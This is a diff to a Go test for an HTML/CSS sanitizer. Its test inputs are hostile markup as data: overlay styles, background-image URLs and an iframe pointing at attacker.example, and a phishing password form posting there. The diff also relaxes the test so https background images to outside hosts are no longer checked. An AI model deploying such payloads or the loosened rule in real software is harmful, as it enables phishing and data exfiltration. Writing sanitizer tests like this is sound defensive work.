@@ -58,14 +58,20 @@ func TestSanitize_PreservesEditorFormatting(t *testing.T) {
 
 // TestSanitize_BlocksDangerousCSSAndMarkup makes sure widening the style
 // allowlist did not open an overlay / exfiltration channel (B002).
+//
+// Offsets (top/left) and https: background images are allowed since the page
+// designer policy: the viewer's containment box keeps positioned content
+// inside it, so the overlay case now only asserts that fixed positioning and
+// an out-of-range z-index are gone. Non-https and data: images stay blocked.
 func TestSanitize_BlocksDangerousCSSAndMarkup(t *testing.T) {
 	cases := []struct {
 		name           string
 		in             string
 		mustNotContain []string
 	}{
-		{"fixed-position overlay", `<div style="position: fixed; top: 0; left: 0; z-index: 9999">x</div>`, []string{"position", "z-index", "top:"}},
-		{"background image url", `<p style="background-image: url(https://attacker.example/x)">x</p>`, []string{"url(", "attacker"}},
+		{"fixed-position overlay", `<div style="position: fixed; top: 0; left: 0; z-index: 9999">x</div>`, []string{"position", "z-index", "fixed", "9999"}},
+		{"background image over http", `<p style="background-image: url(http://attacker.example/x)">x</p>`, []string{"url(", "attacker"}},
+		{"background image data uri", `<p style="background-image: url(data:image/svg+xml;base64,PHN2Zz4=)">x</p>`, []string{"url(", "data:"}},
 		{"style element", `<style>body *{visibility:hidden}</style><p>.</p>`, []string{"<style", "visibility"}},
 		{"phishing form", `<form action="https://attacker.example/x"><input name="password"><button formaction="https://attacker.example/x">Log in</button></form>`, []string{"<form", "<input", "formaction", "attacker"}},
 		{"untrusted iframe", `<iframe src="https://attacker.example/login"></iframe>`, []string{"attacker"}},
